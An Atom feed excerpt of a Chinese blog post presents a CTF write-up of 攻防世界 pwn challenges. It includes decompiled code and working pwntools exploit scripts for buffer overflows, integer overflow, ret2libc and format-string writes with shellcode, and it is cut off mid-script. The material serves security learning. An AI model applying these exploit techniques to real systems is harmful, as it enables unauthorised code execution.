    <category term="CTF" scheme="https://sncker.github.io/blog/categories/CTF/"/>
    
    <category term="WriteUp" scheme="https://sncker.github.io/blog/categories/CTF/WriteUp/"/>
    
    
    <category term="2020" scheme="https://sncker.github.io/blog/tags/2020/"/>
    
    <category term="De1CTF" scheme="https://sncker.github.io/blog/tags/De1CTF/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界CTF-WriteUp</title>
    <link href="https://sncker.github.io/blog/2020/04/25/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCTF-WriteUp/"/>
    <id>https://sncker.github.io/blog/2020/04/25/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCTF-WriteUp/</id>
    <published>2020-04-25T10:44:00.000Z</published>
    <updated>2020-05-01T06:50:49.345Z</updated>
    
    <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200425185019.png" alt=""></p><a id="more"></a><p>IDA分析<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425185138.png" alt=""><br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425185155.png" alt=""><br>很明显的溢出，而且还调用了system，看汇编。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425185409.png" alt=""><br>拿到call_system的地址，然后shift+f12也找到了bin_sh。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425185541.png" alt=""><br>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;level2&quot;</span>)</span><br><span class="line"><span class="comment">#r = remote(&quot;159.138.137.79&quot;, 63180)</span></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Input:&quot;</span>)</span><br><span class="line">call_system_addr = <span class="number">0x0804845C</span></span><br><span class="line">bin_sh_addr = <span class="number">0x0804A024</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8c</span> + p32(call_system_addr) + p32(bin_sh_addr)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200425185947.png" alt=""><br>保护全开了，IDA分析。<br>main反汇编  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> v8; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v10; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  v3 = <span class="built_in">stderr</span>;</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)seed = sub_BB0(v3, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to a guess number game!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please let me know your name!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your name:&quot;</span>);</span><br><span class="line">  gets(&amp;v8);</span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------------Turn:%d-------------\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input your guess number:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;---------------------------------&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 != v7 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;GG!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_C3E();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sub_C3E()是cat flag的。<br>这题就是生成随机数，然后用户猜，猜对10次就可以了。<br>学过C都知道rand()是伪随机数，只要能控制随机数种子，那么随机数就能预测。   </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> v8; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">.</span><br><span class="line">.</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Your name:&quot;</span>);</span><br><span class="line">gets(&amp;v8);</span><br></pre></td></tr></table></figure><p>名字输入处用了gets函数，因此可以溢出。看局部变量声明顺序，名字变量填充0x20字节即可溢出覆盖到种子变量seed。<br>用ldd命令查看程序链接库路径。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425191430.png" alt=""><br>然后固定一个种子值，边调用libc的rand()生成随机数边发送即可。（若远端库版本不一样，虽然固定种子值，但生成的随机数也可能不一样，所以打pwn要尽可能地模拟出和远端一样的环境）<br>脚本  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">so = CDLL(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;guess_num&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;159.138.137.79&quot;</span>, <span class="number">59240</span>)</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;Your name:&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">1</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">so.srand(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;number:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(so.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200425192101.png" alt=""><br>main函数<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425192400.png" alt=""><br>跟进login函数<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425192432.png" alt=""><br>再跟进check_passwd函数<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425192507.png" alt=""><br>check_passwd对传入的字符串进行判断，只要长度在[4,8]之间就会将字符串复制到dest变量。<br>这里很明显，密码字符串的buf长度远大于dest变量，因此可以造成溢出。<br>然后考虑的就是绕过长度限制，v3是字符串长度，它是无符号8位整型，数值范围是0~255，结合题目名字可以知道当v3大于255的时候就会溢出，比如256就会溢出成0,那么[260,264]就可以溢出到[4,8]这个区间。应该不难理解。  </p><table><thead><tr><th align="center">8</th><th align="center">7</th><th align="center">6</th><th align="center">5</th><th align="center">4</th><th align="center">3</th><th align="center">2</th><th align="center">1</th><th align="center">0</th><th align="center">十进制</th></tr></thead><tbody><tr><td align="center"></td><td align="center">1</td><td align="center">1</td><td align="center">1</td><td align="center">1</td><td align="center">1</td><td align="center">1</td><td align="center">1</td><td align="center">1</td><td align="center">255</td></tr><tr><td align="center">1</td><td align="center">0</td><td align="center">0</td><td align="center">0</td><td align="center">0</td><td align="center">0</td><td align="center">0</td><td align="center">0</td><td align="center">0</td><td align="center">256</td></tr></tbody></table><p>8位无符号整型，有效位0~7，溢出后就为0了。<br>绕过了长度问题，就要想溢出后要劫持程序流到哪。<br>仔细找找发现还漏了一个cat flag的函数。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425194729.png" alt=""><br>直接跳上去就可以了。<br>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;int_overflow&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;159.138.137.79&quot;</span>, <span class="number">60855</span>)</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">cat_flag_addr = <span class="number">0x0804868B</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Please input your username:&quot;</span>, <span class="string">&quot;sncker&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span> + p32(cat_flag_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">260</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200425195016.png" alt=""><br>直接贴关键函数。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425195205.png" alt=""><br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425195238.png" alt=""><br>看着hello函数一堆乱起八糟的东西，直接跑一下程序。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425195404.png" alt=""><br>估计是干扰的。去掉这些干扰的代码，剩下的思路就比较清晰。gets可以溢出了，pwn函数里有call_system的地址。shift+12找bin_sh没找到。仔细看一下发现name是全局变量，那么直接写bin_sh进去就可以了。<br>脚本  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;cgpwn2&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;159.138.137.79&quot;</span>, <span class="number">51100</span>)</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">call_system_addr = <span class="number">0x0804855A</span></span><br><span class="line">p_name = <span class="number">0x0804A080</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;here:&quot;</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x26</span> + <span class="string">&#x27;a&#x27;</span>*<span class="number">0x4</span> + p32(call_system_addr) + p32(p_name))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200425195854.png" alt=""><br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425200119.png" alt=""><br>很清晰的思路，先让v5不等于1926再让v5等于1926，gets的v4可以覆盖到v5。<br>脚本  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;when_did_you_born&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;159.138.137.79&quot;</span>, <span class="number">62561</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;Birth?&quot;</span>, <span class="string">&quot;1999&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Name?&quot;</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(<span class="number">1926</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200425200651.png" alt=""><br>又是简单的覆盖。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425200715.png" alt=""><br>相差4直接填充。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;hello_pwn&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;124.126.19.106&quot;</span>, <span class="number">45068</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">4</span> + p64(<span class="number">1853186401</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;for bof&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200425200937.png" alt=""><br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425200957.png" alt=""><br>简单的溢出。平台放题顺序有点问题啊。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#r = process(&quot;level0&quot;)</span></span><br><span class="line">r = remote(<span class="string">&quot;124.126.19.106&quot;</span>, <span class="number">39454</span>)</span><br><span class="line"></span><br><span class="line">callsystem_addr = <span class="number">0x0000000000400596</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(callsystem_addr)</span><br><span class="line">r.sendafter(<span class="string">&quot;World&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><p>这题给了libc文件，终于要ret2libc了。。。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200425201254.png" alt=""><br>虽然有溢出，但是程序里没用system和binsh字符串，只能跳到libc。<br>那么就需要泄露一些库函数的地址，来计算出libc的基址。泄露可以用printf和write这类函数来泄露。这里可以看到在read之前，程序调用过一次write，那么got表里是有write的地址的。所以可以调用write来泄露write的真实地址。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vul_addr = elf.symbols[<span class="string">&quot;vulnerable_function&quot;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8C</span> + p32(write_plt) + p32(vul_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)    <span class="comment">#write(1,write_got,4) 返回地址vul_addr</span></span><br></pre></td></tr></table></figure><p>再次跳回vulnerable_function后就是简单的ret2libc了。<br>完整代码  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;level3&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;level3&quot;</span>)</span><br><span class="line"></span><br><span class="line">vul_addr = elf.symbols[<span class="string">&quot;vulnerable_function&quot;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8C</span> + p32(write_plt) + p32(vul_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">r.sendafter(<span class="string">&quot;put:\n&quot;</span>, payload)</span><br><span class="line">write_addr = u32(r.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">&quot;write_addr: &quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(write_addr)))</span><br><span class="line"></span><br><span class="line">libc_base = write_addr - libc.symbols[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x8C</span> + p32(system_addr) + p32(<span class="number">1</span>) + p32(bin_sh_addr)</span><br><span class="line">r.sendafter(<span class="string">&quot;put:\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h2><p>直接给shell，略。  </p><h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200501135353.png" alt=""><br>sub_400996打印一个龙，然后申请了一块内存给v3，v4=v3，v3[0]=68，v3[1]=85，然后把地址打印出来，跟入sub_400D72(v4)。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200501135916.png" alt=""><br>没什么可利用的，name小于12就行。sub_400A7D里是简单的判断，就不贴了。<br>看sub_400BB9。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200501140321.png" alt=""><br>有一处格式化字符串漏洞。提示v2是输入一个地址，并且v2紧邻format，可导致任意内存写入。再看sub_400CA6。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200501140724.png" alt=""><br>if是判断a1[0]=al[1]，然后mmap看了一下是映射内存，比如可将磁盘文件内容映射到内存里。但是这里的fd位用了-1，就是一个匿名映射。也不太了解干嘛的，但不管映射什么，都是拿到了一块内存。这里就拿到了一块0x1000的内存，然后read0x100，让我们写内存，然后转为函数指针去调用。很明显我们可以写shellcode进去。然后回溯一下a1就是最开始申请的v3。<br>思路就很清晰，首先通过打印得到v3地址，利用fmt漏洞将v3[0]写成85，然后就可以写shellcode了。<br>这里要确定一下输入的v3地址的偏移是多少。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;string&quot;</span>)</span><br><span class="line"><span class="comment">#context(log_level=&quot;debug&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;secret[0] is &quot;</span>)</span><br><span class="line">secret_addr = <span class="built_in">int</span>(r.recv(<span class="number">7</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="built_in">hex</span>(secret_addr))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;character&#x27;s name be:\n&quot;</span>, <span class="string">&quot;sncker&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;east or up?:\n&quot;</span>, <span class="string">&quot;east&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;leave(0)?:\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&#x27;Give me an address&#x27;\n&quot;</span>, <span class="built_in">str</span>(secret_addr))</span><br><span class="line">payload = <span class="string">&quot;aaaa&quot;</span> + <span class="string">&quot;.%x&quot;</span>*<span class="number">10</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;you wish is:\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200501142119.png" alt=""><br>可以看到我们输入的地址相当于格式化字符串的第7个参数。就可以用%85c%7$n将v3[0]写成85了。<br>shellcode用shellcraft生成的就可以了，注意要声明64位。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&quot;string&quot;</span>)</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;secret[0] is &quot;</span>)</span><br><span class="line">secret_addr = <span class="built_in">int</span>(r.recv(<span class="number">7</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="built_in">hex</span>(secret_addr))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;character&#x27;s name be:\n&quot;</span>, <span class="string">&quot;sncker&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;east or up?:\n&quot;</span>, <span class="string">&quot;east&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;leave(0)?:\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;&#x27;Give me an address&#x27;\n&quot;</span>, <span class="built_in">str</span>(secret_addr))</span><br><span class="line"><span class="comment">#payload = &quot;aaaa&quot; + &quot;.%x&quot;*10</span></span><br><span class="line">payload = <span class="string">&quot;%85c%7$n&quot;</span></span><br><span class="line">r.sendlineafter(<span class="string">&quot;you wish is:\n&quot;</span>, payload)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;USE YOU SPELL&quot;</span>, asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h2 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h2><p><img src="https://gitee.com/sncker/resource/raw/master/image/20200501142622.png" alt=""><br>这题也是利用fmt写内存。将pwnme覆写成8就可以了。pwnme是全局变量可以拿到地址。然后就是确定一下偏移。<br><img src="https://gitee.com/sncker/resource/raw/master/image/20200501143254.png" alt=""><br>输入的字符串相当于第10个格式化参数。<br>然后p32(pwnme)刚好是4字节小于8所以可以把地址写在前面。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 